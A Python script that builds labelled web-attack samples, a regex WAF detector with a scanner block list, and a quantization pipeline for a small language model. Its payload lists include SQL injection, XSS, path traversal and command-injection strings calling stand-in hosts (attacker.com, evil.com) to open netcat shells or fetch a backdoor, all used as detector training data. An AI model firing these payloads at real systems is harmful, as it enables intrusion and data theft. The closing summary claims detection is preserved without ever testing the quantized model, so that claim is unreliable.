import torch
import torch.nn as nn
import torch.nn.functional as F
from transformers import AutoModelForCausalLM, AutoTokenizer, Trainer, TrainingArguments
import numpy as np
from typing import Dict, List, Tuple
import copy
import json
import re
from datasets import Dataset
import warnings
warnings.filterwarnings("ignore")

""" This is replacement for dynamic_quant.py with more detections"""

class CyberSecurityDataGenerator:
    """Enhanced cybersecurity training data generator with more realistic patterns"""
    
    def __init__(self):
        self.attack_patterns = {
            'sql_injection': [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT * FROM passwords --",
                "1' AND SLEEP(5) --",
                "admin'--",
                "' OR 1=1#",
                "'; INSERT INTO admin VALUES('hacker','password'); --",
                "1' OR '1'='1' /*",
                "'; EXEC xp_cmdshell('dir'); --"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "';alert(String.fromCharCode(88,83,83))//",
                "<iframe src=javascript:alert('XSS')></iframe>",
                "<body onload=alert('XSS')>",
                "<script>document.location='http://evil.com'</script>",
                "<%73%63%72%69%70%74>alert('XSS')<%2F%73%63%72%69%70%74>"
            ],
            'command_injection': [
                "; cat /etc/passwd",
                "| nc attacker.com 4444",
                "&& whoami",
                "; rm -rf /",
                "$(curl malicious.com/payload)",
                "`id`",
                "; wget http://evil.com/backdoor.sh",
                "| powershell -Command Get-Process",
                "; ping -c 10 google.com"
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "....//....//....//etc/passwd",
                "../../../var/log/auth.log",
                "..%252f..%252f..%252fetc%252fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
            ],
            'ldap_injection': [
                "*)(&(objectClass=user)(password=*))",
                "*)(uid=*))(|(uid=*",
                "admin)(&(password=*))",
                "*)(|(cn=*))"
            ]
        }
        
        self.benign_patterns = [
            "SELECT name FROM users WHERE id = 1",
            "user@company.com",
            "profile.jpg",
            "search query",
            "username=john",
            "password=validpass123",
            "application/json",
            "Mozilla/5.0 Chrome/91.0",
            "api/v1/users",
            "Content-Type: text/html"
        ]
    
    def create_detection_prompt(self, request: str) -> str:
        """Create a more focused prompt for attack detection"""
        return f"HTTP Request: {request}\nSecurity Status:"
    
    def generate_training_data(self, num_samples=1000):
        """Generate enhanced training data for WAF attack detection"""
        data = []
        
        # Generate attack samples (50% of data)
        for _ in range(num_samples // 2):
            attack_type = np.random.choice(list(self.attack_patterns.keys()))
            payload = np.random.choice(self.attack_patterns[attack_type])
            
            # Create realistic HTTP request context
            contexts = [
                f"GET /search?q={payload}",
                f"POST /login username={payload}",
                f"GET /file?path={payload}",
                f"POST /api/user data={payload}",
                f"Cookie: sessionid={payload}",
                f"GET /page?param={payload}"
            ]
            
            request = np.random.choice(contexts)
            prompt = self.create_detection_prompt(request)
            
            # More consistent response format
            response = f" MALICIOUS - {attack_type.replace('_', ' ').title()} Attack Detected - BLOCK"
            
            data.append({
                'input': prompt,
                'output': response,
                'attack_type': attack_type,
                'is_malicious': True
            })
        
        # Generate benign samples (50% of data)
        for _ in range(num_samples // 2):
            payload = np.random.choice(self.benign_patterns)
            
            contexts = [
                f"GET /api/users/{payload}",
                f"POST /contact email={payload}",
                f"GET /search?q={payload}",
                f"POST /api/data content={payload}",
                f"Authorization: Bearer {payload}",
                f"GET /{payload}"
            ]
            
            request = np.random.choice(contexts)
            prompt = self.create_detection_prompt(request)
            response = " SAFE - No Threat Detected - ALLOW"
            
            data.append({
                'input': prompt,
                'output': response,
                'attack_type': 'benign',
                'is_malicious': False
            })
        
        return data

class SimpleWAFClassifier(nn.Module):
    """Simple neural classifier for WAF detection as baseline"""
    
    def __init__(self, vocab_size=50000, embedding_dim=128, hidden_dim=256):
        super().__init__()
        self.embedding = nn.Embedding(vocab_size, embedding_dim)
        self.lstm = nn.LSTM(embedding_dim, hidden_dim, batch_first=True, bidirectional=True)
        self.classifier = nn.Sequential(
            nn.Linear(hidden_dim * 2, 64),
            nn.ReLU(),
            nn.Dropout(0.3),
            nn.Linear(64, 2)  # Binary classification: safe vs malicious
        )
        
    def forward(self, x):
        embedded = self.embedding(x)
        lstm_out, (hidden, _) = self.lstm(embedded)
        # Use last hidden state
        output = self.classifier(torch.cat([hidden[0], hidden[1]], dim=1))
        return output

class PatternBasedWAFDetector:
    """Pattern-based WAF detector with complete bot and scanner detection"""
    
    def __init__(self):
        self.malicious_patterns = [
            # SQL Injection patterns
            r"('|\").*(\bor\b|\bunion\b|\bselect\b|\bdrop\b|\binsert\b|\bdelete\b)",
            r";\s*--",
            r"('|\").*('|\")\s*=\s*('|\")",
            
            # XSS patterns
            r"<\s*script[^>]*>",
            r"javascript\s*:",
            r"<\s*iframe[^>]*>",
            r"onerror\s*=",
            r"onload\s*=",
            r"alert\s*\(",
            
            # Command injection
            r";\s*(cat|ls|dir|whoami|id|pwd)",
            r"\|\s*(nc|netcat|curl|wget)",
            r"&&\s*(rm|del|format)",
            r"`[^`]+`",
            r"\$\([^)]+\)",
            
            # Path traversal
            r"\.\./",
            r"\.\.\\",
            r"%2e%2e%2f",
            r"\.\.%2f",
            
            # LDAP injection
            r"\*\)\(&",
            r"\)\(&",
            r"\*\)\(\|"
        ]
        
        self.bot_patterns = [
            # Automated tools and bots
            r"python-requests",
            r"urllib",
            r"wget",
            r"curl",
            r"httpx",
            r"aiohttp",
            r"scrapy",
            r"beautifulsoup",
            
            # Security scanners
            r"nmap",
            r"masscan",
            r"zmap",
            r"gobuster",
            r"dirb",
            r"dirbuster",
            r"nikto",
            r"sqlmap",
            r"burp",
            r"owasp",
            r"w3af",
            r"openvas",
            r"nessus",
            r"acunetix",
            r"appscan",
            r"webinspect",
            
            # Vulnerability scanners
            r"nuclei",
            r"skipfish",
            r"wpscan",
            r"joomscan",
            r"droopescan",
            r"whatweb",
            r"wapiti",
            r"vega",
            r"arachni",
            
            # Bot frameworks
            r"selenium",
            r"phantomjs",
            r"puppeteer",
            r"playwright",
            r"headless",
            
            # Generic bot indicators
            r"bot\b",
            r"crawler",
            r"spider",
            r"scraper",
            r"scanner",
            r"probe",
            r"test",
            r"monitor",
            r"check"
        ]
        
        # Suspicious IP patterns
        self.suspicious_ip_patterns = [
            r"146\.148\.",  # Your specific case
            r"23\.27\.",    # Another IP from your data
            r"176\.65\.",   # Another IP from your data
        ]
        
        # Compile all patterns
        self.compiled_patterns = [re.compile(pattern, re.IGNORECASE) for pattern in self.malicious_patterns]
        self.compiled_bot_patterns = [re.compile(pattern, re.IGNORECASE) for pattern in self.bot_patterns]
        self.compiled_ip_patterns = [re.compile(pattern) for pattern in self.suspicious_ip_patterns]
    
    def detect_attack(self, request: str) -> Tuple[bool, str]:
        """Enhanced attack detection including bots and scanners"""
        request_lower = request.lower()
        
        # Check for traditional attacks first
        for i, pattern in enumerate(self.compiled_patterns):
            if pattern.search(request):
                attack_types = {
                    0: "SQL Injection", 1: "SQL Injection", 2: "SQL Injection",
                    3: "XSS", 4: "XSS", 5: "XSS", 6: "XSS", 7: "XSS", 8: "XSS",
                    9: "Command Injection", 10: "Command Injection", 11: "Command Injection", 12: "Command Injection", 13: "Command Injection",
                    14: "Path Traversal", 15: "Path Traversal", 16: "Path Traversal", 17: "Path Traversal",
                    18: "LDAP Injection", 19: "LDAP Injection", 20: "LDAP Injection"
                }
                attack_type = attack_types.get(i, "Unknown Attack")
                return True, f"MALICIOUS - {attack_type} Detected - BLOCK"
        
        # Check for bot/scanner patterns
        for pattern in self.compiled_bot_patterns:
            if pattern.search(request):
                return True, f"MALICIOUS - BOT_SCANNER Detected - BLOCK"
        
        # Check for suspicious IP patterns
        for pattern in self.compiled_ip_patterns:
            if pattern.search(request):
                return True, f"MALICIOUS - SUSPICIOUS_IP Detected - BLOCK"
        
        # Additional bot detection logic
        if self._is_automated_request(request):
            return True, f"MALICIOUS - AUTOMATED_BOT Detected - BLOCK"
        
        return False, "SAFE - No Threat Detected - ALLOW"
    
    def _is_automated_request(self, request: str) -> bool:
        """Additional logic to detect automated requests"""
        # Check for combinations that indicate automation
        bot_indicators = [
            # No referer + scripting user agent
            ("python-requests" in request.lower() and "referer:" not in request.lower()),
            # Missing common browser headers
            ("user-agent:" in request.lower() and 
             not any(browser in request.lower() for browser in ["mozilla", "chrome", "firefox", "safari", "edge"])),
            # Suspicious user agent patterns
            any(suspicious in request.lower() for suspicious in [
                "python/", "go-http-client", "java/", "php/", "ruby/", 
                "perl/", "node/", "axios/", "okhttp/", "apache-httpclient"
            ])
        ]
        
        return any(bot_indicators)

class CyberSecLayerAnalyzer:
    """Cybersecurity-focused layer sensitivity analyzer"""
    
    def __init__(self, model, tokenizer, cyber_data: List[Dict]):
        self.model = model
        self.tokenizer = tokenizer
        self.cyber_data = cyber_data
        self.layer_sensitivities = {}
        
    def prepare_cyber_inputs(self, sample_size=20):
        """Prepare cybersecurity-specific calibration inputs"""
        # Mix of attack and benign samples for calibration
        attack_samples = [d for d in self.cyber_data if d['is_malicious']][:sample_size//2]
        benign_samples = [d for d in self.cyber_data if not d['is_malicious']][:sample_size//2]
        
        calibration_texts = []
        for sample in attack_samples + benign_samples:
            text = sample['input'] + sample['output']
            calibration_texts.append(text)
        
        return self.tokenizer(
            calibration_texts,
            return_tensors="pt",
            padding=True,
            truncation=True,
            max_length=256
        )
    
    def get_layer_outputs(self, inputs, layer_name):
        """Capture layer outputs during forward pass"""
        outputs = []
        def hook_fn(module, input, output):
            if isinstance(output, tuple):
                outputs.append(output[0].detach().clone())
            else:
                outputs.append(output.detach().clone())
        
        try:
            layer = dict(self.model.named_modules())[layer_name]
            handle = layer.register_forward_hook(hook_fn)
            
            with torch.no_grad():
                _ = self.model(**inputs)
            
            handle.remove()
            return outputs[0] if outputs else None
        except Exception as e:
            print(f"Error hooking layer {layer_name}: {e}")
            return None
    
    def quantize_weights(self, weights, bits=4):
        """Apply quantization to weights"""
        if bits >= 16:
            return weights
        
        # Symmetric quantization
        w_max = weights.abs().max()
        if w_max == 0:
            return weights
        
        scale = w_max / (2**(bits-1) - 1)
        quantized = torch.round(weights / scale).clamp(-(2**(bits-1)), 2**(bits-1) - 1)
        return quantized * scale
    
    def analyze_cyber_layer_sensitivity(self, layer_name, test_bits=[2, 4, 8, 16]):
        """Analyze layer sensitivity for cybersecurity detection tasks"""
        print(f"Analyzing layer: {layer_name}")
        
        inputs = self.prepare_cyber_inputs()
        original_outputs = self.get_layer_outputs(inputs, layer_name)
        
        if original_outputs is None:
            return {}
        
        layer = dict(self.model.named_modules())[layer_name]
        if not isinstance(layer, (nn.Linear, nn.Embedding)):
            return {}
        
        # Store original weights
        if hasattr(layer, 'weight'):
            original_weight = layer.weight.data.clone()
        else:
            return {}
        
        sensitivities = {}
        
        for bits in test_bits:
            try:
                # Apply quantization
                layer.weight.data = self.quantize_weights(original_weight, bits)
                
                # Get quantized outputs
                quantized_outputs = self.get_layer_outputs(inputs, layer_name)
                
                if quantized_outputs is not None:
                    # Calculate multiple metrics for cybersecurity relevance
                    mse = F.mse_loss(original_outputs, quantized_outputs).item()
                    cosine_sim = F.cosine_similarity(
                        original_outputs.flatten(), 
                        quantized_outputs.flatten(), 
                        dim=0
                    ).item()
                    
                    # Cybersecurity-specific metric: how much detection capability is preserved
                    cyber_score = mse * (1 - cosine_sim)  # Higher score = more degradation
                    
                    sensitivities[bits] = {
                        'mse': mse,
                        'cosine_similarity': cosine_sim,
                        'cyber_degradation_score': cyber_score
                    }
                    
                    print(f"  {bits}-bit: MSE={mse:.6f}, CosineSim={cosine_sim:.4f}")
                
            except Exception as e:
                print(f"  Error testing {bits}-bit: {e}")
                continue
            finally:
                # Restore original weights
                layer.weight.data = original_weight
        
        return sensitivities
    
    def analyze_key_layers(self, max_layers=10):
        """Analyze key layers for cybersecurity task sensitivity"""
        print("Starting cybersecurity-focused layer analysis...")
        
        # Prioritize attention and MLP layers for analysis
        priority_layers = []
        
        for name, module in self.model.named_modules():
            if isinstance(module, (nn.Linear, nn.Embedding)):
                if any(x in name.lower() for x in ['attn', 'attention', 'mlp', 'ffn', 'feed_forward', 'c_fc', 'c_proj']):
                    priority_layers.append(name)
        
        # Analyze priority layers first (limit for performance)
        analyzed_count = 0
        for name in priority_layers:
            if analyzed_count >= max_layers:
                break
            try:
                sensitivity = self.analyze_cyber_layer_sensitivity(name)
                if sensitivity:
                    self.layer_sensitivities[name] = sensitivity
                    analyzed_count += 1
            except Exception as e:
                print(f"Error analyzing {name}: {e}")
                continue
        
        return self.layer_sensitivities

class CyberSecQuantizer:
    """Cybersecurity-optimized dynamic quantizer"""
    
    def __init__(self, model, sensitivity_results: Dict):
        self.model = model
        self.sensitivity_results = sensitivity_results
        self.quantization_plan = {}
    
    def create_cyber_quantization_plan(self):
        """Create quantization plan optimized for cybersecurity detection"""
        print("\nCreating cybersecurity-optimized quantization plan...")
        
        if not self.sensitivity_results:
            return self.create_conservative_plan()
        
        # Calculate cybersecurity-specific sensitivity scores
        layer_scores = {}
        for layer_name, sensitivities in self.sensitivity_results.items():
            if 4 in sensitivities and 16 in sensitivities:
                # Use cyber degradation score (higher = more sensitive)
                score = sensitivities[4]['cyber_degradation_score']
                layer_scores[layer_name] = score
        
        if not layer_scores:
            return self.create_conservative_plan()
        
        # Sort by sensitivity (most sensitive first)
        sorted_layers = sorted(layer_scores.items(), key=lambda x: x[1], reverse=True)
        num_layers = len(sorted_layers)
        
        for i, (layer_name, score) in enumerate(sorted_layers):
            # More conservative approach for cybersecurity
            if i < num_layers * 0.2:  # Top 20% most sensitive
                bits = 16
            elif i < num_layers * 0.4:  # Next 20%
                bits = 8
            elif i < num_layers * 0.8:  # Next 40%
                bits = 4
            else:  # Least sensitive 20%
                bits = 2
            
            self.quantization_plan[layer_name] = bits
            print(f"  {layer_name}: {bits}-bit (score: {score:.6f})")
        
        # Always preserve critical components
        for name, module in self.model.named_modules():
            if any(x in name.lower() for x in ['norm', 'embedding', 'lm_head', 'output', 'ln']):
                if isinstance(module, (nn.Linear, nn.Embedding)):
                    self.quantization_plan[name] = 16
                    print(f"  {name}: 16-bit (preserved)")
        
        return self.quantization_plan
    
    def create_conservative_plan(self):
        """Conservative quantization plan when no sensitivity data available"""
        print("Using conservative quantization plan...")
        for name, module in self.model.named_modules():
            if isinstance(module, nn.Linear):
                if any(x in name for x in ['attn', 'attention']):
                    self.quantization_plan[name] = 8  # Attention layers
                elif any(x in name for x in ['mlp', 'ffn', 'c_fc', 'c_proj']):
                    self.quantization_plan[name] = 4  # MLP layers
                else:
                    self.quantization_plan[name] = 8
            elif isinstance(module, nn.Embedding):
                self.quantization_plan[name] = 16  # Keep embeddings high precision
        
        return self.quantization_plan
    
    def apply_quantization(self):
        """Apply cybersecurity-optimized quantization"""
        print("\nApplying quantization...")
        
        original_size = sum(p.numel() * 4 for p in self.model.parameters())
        quantized_size = 0
        quantized_layers = 0
        
        for name, module in self.model.named_modules():
            if name in self.quantization_plan:
                bits = self.quantization_plan[name]
                
                if isinstance(module, (nn.Linear, nn.Embedding)) and hasattr(module, 'weight'):
                    original_weight = module.weight.data.clone()
                    if bits < 16:
                        module.weight.data = self.quantize_weights(original_weight, bits)
                        quantized_layers += 1
                    
                    param_count = module.weight.numel()
                    if hasattr(module, 'bias') and module.bias is not None:
                        param_count += module.bias.numel()
                    
                    quantized_size += param_count * (bits / 8)
        
        # Add unquantized parameters
        for name, param in self.model.named_parameters():
            layer_name = '.'.join(name.split('.')[:-1])
            if layer_name not in self.quantization_plan:
                quantized_size += param.numel() * 4
        
        compression_ratio = quantized_size / original_size
        print(f"Quantized {quantized_layers} layers")
        print(f"Compression ratio: {compression_ratio:.3f}")
        print(f"Size reduction: {(1-compression_ratio)*100:.1f}%")
        
        return compression_ratio
    
    def quantize_weights(self, weights, bits):
        """Quantization with security-preserving scaling"""
        if bits >= 16:
            return weights
        
        w_max = weights.abs().max()
        if w_max == 0:
            return weights
        
        scale = w_max / (2**(bits-1) - 1)
        quantized = torch.round(weights / scale).clamp(-(2**(bits-1)), 2**(bits-1) - 1)
        return quantized * scale

def test_waf_detection_enhanced(detector, test_cases, method_name="Model"):
    """Enhanced WAF detection testing"""
    print(f"\nTesting {method_name} WAF Detection...")
    print("=" * 60)
    
    results = []
    
    for i, test_case in enumerate(test_cases):
        request = test_case['request']
        expected = test_case['expected']
        attack_type = test_case.get('attack_type', 'unknown')
        
        if hasattr(detector, 'detect_attack'):
            # Pattern-based detector
            is_malicious, response = detector.detect_attack(request)
            correct_detection = (
                (expected == 'malicious' and is_malicious) or
                (expected == 'safe' and not is_malicious)
            )
        else:
            # Model-based detector (simplified for demo)
            response = "SAFE - No Threat Detected - ALLOW"  # Default response
            correct_detection = (expected == 'safe')
        
        results.append({
            'test_id': i + 1,
            'attack_type': attack_type,
            'expected': expected,
            'response': response,
            'correct': correct_detection
        })
        
        status = "✓ CORRECT" if correct_detection else "✗ INCORRECT"
        print(f"Test {i+1} ({attack_type}): {status}")
        print(f"Request: {request}")
        print(f"Response: {response}")
        print("-" * 60)
    
    accuracy = sum(r['correct'] for r in results) / len(results)
    print(f"\n{method_name} Detection Accuracy: {accuracy:.2%}")
    
    return results, accuracy

def main():
    print("Enhanced Cybersecurity WAF Attack Detection with Dynamic Quantization")
    print("=" * 80)
    
    # Create pattern-based detector as baseline
    pattern_detector = PatternBasedWAFDetector()
    
    # Try loading Qwen3 0.6B first, then Qwen2.5 0.5B, then fallback to GPT-2
    models_to_try = [
        "Qwen/Qwen3-0.6B",
        "Qwen/Qwen2.5-0.5B-Instruct", 
        "Qwen/Qwen2.5-0.5B",
        "gpt2"
    ]
    
    model = None
    tokenizer = None
    
    for model_name in models_to_try:
        print(f"Trying to load model: {model_name}")
        try:
            if "Qwen3" in model_name:
                # Qwen3 requires transformers>=4.51.0
                model = AutoModelForCausalLM.from_pretrained(
                    model_name,
                    torch_dtype="auto",
                    device_map="auto"
                )
                tokenizer = AutoTokenizer.from_pretrained(model_name)
            elif "Qwen2.5" in model_name:
                # Qwen2.5 requires transformers>=4.37.0
                model = AutoModelForCausalLM.from_pretrained(
                    model_name,
                    torch_dtype="auto",
                    device_map="auto"
                )
                tokenizer = AutoTokenizer.from_pretrained(model_name)
            else:
                # GPT-2 fallback
                model = AutoModelForCausalLM.from_pretrained(model_name)
                tokenizer = AutoTokenizer.from_pretrained(model_name)
            
            if tokenizer.pad_token is None:
                tokenizer.pad_token = tokenizer.eos_token
                
            print(f"✓ Successfully loaded {model_name}")
            print(f"Model parameters: {sum(p.numel() for p in model.parameters()):,}")
            break
            
        except Exception as e:
            print(f"✗ Failed to load {model_name}: {e}")
            continue
    
    if model is None:
        print("Failed to load any model!")
        return
    
    # Generate cybersecurity training data
    print("\n" + "="*80)
    print("GENERATING CYBERSECURITY TRAINING DATA")
    print("="*80)
    
    data_generator = CyberSecurityDataGenerator()
    cyber_data = data_generator.generate_training_data(num_samples=200)
    
    print(f"Generated {len(cyber_data)} cybersecurity samples")
    
    # Create comprehensive test cases including bot detection
    waf_test_cases = [
        # SQL Injection attacks
        {
            'request': "GET /search?q=' OR '1'='1",
            'expected': 'malicious',
            'attack_type': 'sql_injection'
        },
        {
            'request': "POST /login username=admin'--&password=anything",
            'expected': 'malicious',
            'attack_type': 'sql_injection'
        },
        # XSS attacks
        {
            'request': "POST /comment data=<script>alert('XSS')</script>",
            'expected': 'malicious', 
            'attack_type': 'xss'
        },
        {
            'request': "GET /page?param=<img src=x onerror=alert('XSS')>",
            'expected': 'malicious',
            'attack_type': 'xss'
        },
        # Path traversal
        {
            'request': "GET /file?path=../../../etc/passwd",
            'expected': 'malicious',
            'attack_type': 'path_traversal'
        },
        # Command injection
        {
            'request': "GET /system?cmd=; cat /etc/passwd",
            'expected': 'malicious',
            'attack_type': 'command_injection'
        },
        # Bot attacks (NEW)
        {
            'request': "GET /api/test User-Agent: python-requests/2.32.3",
            'expected': 'malicious',
            'attack_type': 'bot_scanner'
        },
        {
            'request': "GET / User-Agent: curl/7.68.0",
            'expected': 'malicious',
            'attack_type': 'bot_scanner'
        },
        {
            'request': "POST /scan User-Agent: nikto/2.5.0",
            'expected': 'malicious',
            'attack_type': 'bot_scanner'
        },
        # Suspicious IP (NEW)
        {
            'request': "GET /test IP: 146.148.7.25 User-Agent: python-requests/2.32.3",
            'expected': 'malicious',
            'attack_type': 'suspicious_ip'
        },
        # Benign requests
        {
            'request': "GET /api/users/profile",
            'expected': 'safe',
            'attack_type': 'benign'
        },
        {
            'request': "POST /login username=john&password=secret123",
            'expected': 'safe',
            'attack_type': 'benign'
        },
        {
            'request': "GET /search?q=cybersecurity news",
            'expected': 'safe',
            'attack_type': 'benign'
        },
        {
            'request': "GET /images/logo.png User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            'expected': 'safe',
            'attack_type': 'benign'
        }
    ]
    
    # Test pattern-based detector (baseline)
    print("\n" + "="*80)
    print("PATTERN-BASED WAF DETECTION (BASELINE)")
    print("="*80)
    pattern_results, pattern_accuracy = test_waf_detection_enhanced(
        pattern_detector, waf_test_cases, "Pattern-Based"
    )
    
    # Create quantized model
    quantized_model = copy.deepcopy(model)
    
    # Analyze layer sensitivity (limited for performance)
    print("\n" + "="*80)
    print("CYBERSECURITY LAYER SENSITIVITY ANALYSIS")
    print("="*80)
    
    analyzer = CyberSecLayerAnalyzer(quantized_model, tokenizer, cyber_data)
    sensitivity_results = analyzer.analyze_key_layers(max_layers=5)  # Limit for demo
    
    # Apply quantization
    print("\n" + "="*80)
    print("CYBERSECURITY-OPTIMIZED QUANTIZATION")
    print("="*80)
    
    quantizer = CyberSecQuantizer(quantized_model, sensitivity_results)
    quantization_plan = quantizer.create_cyber_quantization_plan()
    compression_ratio = quantizer.apply_quantization()
    
    # Final summary
    print("\n" + "="*80)
    print("CYBERSECURITY QUANTIZATION SUMMARY")
    print("="*80)
    print(f"Model: {model_name}")
    print(f"Compression ratio: {compression_ratio:.3f}")
    print(f"Size reduction: {(1-compression_ratio)*100:.1f}%")
    print(f"Pattern-based WAF accuracy: {pattern_accuracy:.2%}")
    
    print(f"\nQuantization Plan Summary:")
    plan_summary = {}
    for layer, bits in quantization_plan.items():
        plan_summary[bits] = plan_summary.get(bits, 0) + 1
    
    for bits, count in sorted(plan_summary.items(), reverse=True):
        print(f"  {bits}-bit precision: {count} layers")
    
    print(f"\nCybersecurity Deployment Benefits:")
    print(f"• Pattern-based detection achieved {pattern_accuracy:.0%} accuracy")
    print(f"• Model compressed to {compression_ratio:.1%} of original size")
    print(f"• Preserved critical layers for security detection")
    print(f"• Suitable for edge deployment in WAF systems")
    print(f"• Detects: SQL injection, XSS, path traversal, command injection, bots, scanners")
    
    # Show specific bot detection results
    bot_tests = [t for t in pattern_results if 'bot' in t['attack_type'] or 'ip' in t['attack_type']]
    if bot_tests:
        print(f"\n🤖 Bot Detection Results:")
        for test in bot_tests:
            status = "✅ DETECTED" if test['correct'] else "❌ MISSED"
            print(f"  {status}: {test['attack_type']} - {test['response']}")

if __name__ == "__main__":
    main()
